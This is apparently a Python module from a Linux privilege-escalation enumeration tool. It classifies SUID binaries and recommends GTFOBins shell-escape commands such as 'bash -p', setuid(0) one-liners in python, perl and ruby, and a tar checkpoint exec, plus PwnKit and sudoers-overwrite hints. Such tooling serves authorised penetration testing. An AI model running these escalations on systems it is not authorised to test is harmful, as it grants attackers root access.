# ==========================================
# INFORMATIONAL BINARIES
# ==========================================

INFO = {

    "mount",
    "umount",
    "su",
    "passwd",
    "chsh",
    "chfn",
    "gpasswd",
    "newgrp",
    "newuidmap",
    "newgidmap",
    "ping",
    "ping6",
    "traceroute6.iputils",
    "mount.nfs",

}

ACTIONABLE = {

    "bash": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "bash -p"
        ]
    },

    "find": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "find . -exec /bin/sh -p \\; -quit"
        ]
    },

    "vim": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "vim -c ':!/bin/sh'"
        ]
    },

    "vi": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "vi -c ':!/bin/sh'"
        ]
    },

    "less": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "Open any file.",
            "Type !sh"
        ]
    },

    "more": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "Open any file.",
            "Type !sh"
        ]
    },

    "awk": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "awk 'BEGIN {system(\"/bin/sh\")}'"
        ]
    },

    "sed": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "sed -n '1e exec sh 1>&0' /etc/hosts"
        ]
    },

    "env": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "env /bin/sh -p"
        ]
    },

    "python": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
        ]
    },

    "python3": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
        ]
    },

    "perl": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'"
        ]
    },

    "ruby": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
        ]
    },

    "tar": {
        "priority": "HIGH",
        "reason": "GTFOBins",
        "recommendation": [
            "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
        ]
    },

    "tee": {
        "priority": "HIGH",
        "reason": "Can overwrite root-owned files",
        "recommendation": [
            "Check if arbitrary file write is possible.",
            "Consider authorized_keys or sudoers."
        ]
    },

}


VERSION_CHECK = {

    "pkexec": {
        "priority": "MEDIUM",
        "reason": "Check for PwnKit (CVE-2021-4034)",
        "recommendation": [
            "pkexec --version"
        ]
    },

    "sudo": {
        "priority": "MEDIUM",
        "reason": "Historical privilege escalation CVEs",
        "recommendation": [
            "sudo --version",
            "searchsploit sudo"
        ]
    },

    "screen-4.5.0": {
        "priority": "MEDIUM",
        "reason": "Historical Screen privilege escalation",
        "recommendation": [
            "screen --version",
            "searchsploit screen"
        ]
    },

    "snap-confine": {
        "priority": "MEDIUM",
        "reason": "Historical Snap privilege escalations",
        "recommendation": [
            "snap version",
            "searchsploit snapd"
        ]
    },

    "polkit-agent-helper-1": {
        "priority": "MEDIUM",
        "reason": "Related Polkit privilege escalations",
        "recommendation": [
            "Check installed polkit version."
        ]
    },

    "dbus-daemon-launch-helper": {
        "priority": "MEDIUM",
        "reason": "Historical D-Bus privilege escalations",
        "recommendation": [
            "Check installed dbus version."
        ]
    },

    "vmware-user-suid-wrapper": {
        "priority": "MEDIUM",
        "reason": "Historical VMware Tools privilege escalations",
        "recommendation": [
            "vmware-toolbox-cmd -v"
        ]
    }

}

# ==========================================
# PARSER
# ==========================================

def _parse(section):

    entries = []
    for line in section.splitlines():
        line = line.strip()

        if not line:
            continue

        if line.startswith(">>>"):
            continue

        if not line.startswith("-"):
            continue

        entries.append(line)

    return entries


# ==========================================
# CLASSIFIER
# ==========================================

def _classify(line):

    path = line.split()[-1]
    binary = path.split("/")[-1]

    if binary in INFO:
        return "info", path, None

    if binary in ACTIONABLE:
        return "actionable", path, ACTIONABLE[binary]

    if binary in VERSION_CHECK:
        return "version", path, VERSION_CHECK[binary]

    return "custom", path, binary


# ==========================================
# PUBLIC API
# ==========================================

def analyze(section):

    results = {
        "actionable": [],
        "version": [],
        "custom": [],
        "info": [],
    }

    findings = []

    for line in _parse(section):

        category, path, info = _classify(line)
        binary = path.split("/")[-1]
        results[category].append((path, binary))

        if category == "actionable":

            findings.append({

                "priority": info["priority"],
                "module": "SUID",
                "title": path,
                "reason": info["reason"],
                "recommendation": info["recommendation"]

            })

        elif category == "version":

            findings.append({

                "priority": info["priority"],
                "module": "SUID",
                "title": path,
                "reason": info["reason"],
                "recommendation": info["recommendation"]

            })

        elif category == "custom":

            findings.append({

                "priority": "LOW",
                "module": "SUID",
                "title": path,
                "reason": "Unknown SUID binary",
                "recommendation": [
                    
                ]

            })
        

    return {

    "module": "SUID",

    "summary": {

        "Actionable":
            len(results["actionable"]),

        "Version":
            len(results["version"]),
 
        "Custom":
            len(results["custom"]),

        "Info":
            len(results["info"]),

        "Total":
            sum(len(v) for v in results.values())

    },

    "findings": findings,

    "details": results

}